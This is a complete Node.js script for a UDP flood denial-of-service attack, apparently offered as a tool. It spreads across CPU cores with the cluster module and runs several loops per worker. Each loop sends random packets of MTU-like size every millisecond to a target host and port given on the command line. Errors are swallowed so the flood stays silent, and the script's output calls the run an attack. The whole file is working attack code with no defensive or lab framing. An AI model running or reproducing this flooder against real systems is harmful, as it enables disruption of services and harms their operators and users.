const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

// UDP Amplification / Payload Flusher
const numCPUs = os.cpus().length > 4 ? os.cpus().length : 4;

const target = process.argv[2];
const portStr = process.argv[3];
const durationStr = process.argv[4] || "60";

if (!target || !portStr) {
    console.error('Usage: node udp.js <target> <port> [duration]');
    process.exit(1);
}

const port = parseInt(portStr, 10);
const duration = parseInt(durationStr, 10);

if (cluster.isMaster) {
    console.log(`[UDP-X] Starting localized UDP flood on ${target}:${port} with ${numCPUs} threads.`);
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('[UDP-X] Attack finished.');
        process.exit(0);
    }, duration * 1000);
} else {
    const client = dgram.createSocket('udp4');

    function startFlood() {
        setInterval(() => {
            // Generate randomized payloads (approx MTU length)
            const size = Math.floor(Math.random() * (1200 - 512 + 1)) + 512;
            const payload = crypto.randomBytes(size);

            client.send(payload, 0, payload.length, port, target, (err) => {
                // Ignore DGRAM routing errors to keep flooding silent
            });
        }, 1);
    }

    // Spin up multiple send loops per thread for higher RPS 
    for (let i = 0; i < 5; i++) {
        startFlood();
    }
}
